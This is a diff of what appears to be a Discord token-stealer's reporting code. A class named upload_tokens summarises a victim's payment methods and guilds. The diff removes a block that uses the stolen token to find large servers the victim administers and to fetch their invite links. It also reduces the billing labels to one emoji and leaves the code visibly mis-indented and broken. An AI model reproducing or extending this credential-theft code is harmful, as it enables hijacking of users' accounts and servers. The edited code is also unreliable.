@@ -251,48 +251,12 @@ class upload_tokens:
             if billing:
                 payment_methods = []
 
-                for method in billing:
-                    if method['type'] == 1:
-                        payment_methods.append('💳')
+                payment_methods.append('💳')
                     
-                    elif method['type'] == 2:
-                        payment_methods.append("<:paypal:973417655627288666>")
-
-                    else:
-                        payment_methods.append('❓')
-
                 payment_methods = ', '.join(payment_methods)
-
             else:
                 payment_methods = None
 
-            if guilds:
-                hq_guilds = []
-                for guild in guilds:
-                    admin = True if guild['permissions'] == '4398046511103' else False
-                    if admin and guild['approximate_member_count'] >= 100:
-                        owner = "✅" if guild['owner'] else "❌"
-
-                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
-                        if len(invites) > 0:
-                            invite = f"https://discord.gg/{invites[0]['code']}"
-                        else:
-                            invite = "https://youtu.be/dQw4w9WgXcQ"
-
-                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
-                        
-                        if len('\n'.join(hq_guilds)) + len(data) >= 1024:
-                            break
-
-                        hq_guilds.append(data)
-
-                if len(hq_guilds) > 0:
-                    hq_guilds = '\n'.join(hq_guilds)
-                
-                else:
-                    hq_guilds = None
-
-            else:
                 hq_guilds = None
 
             if friends:
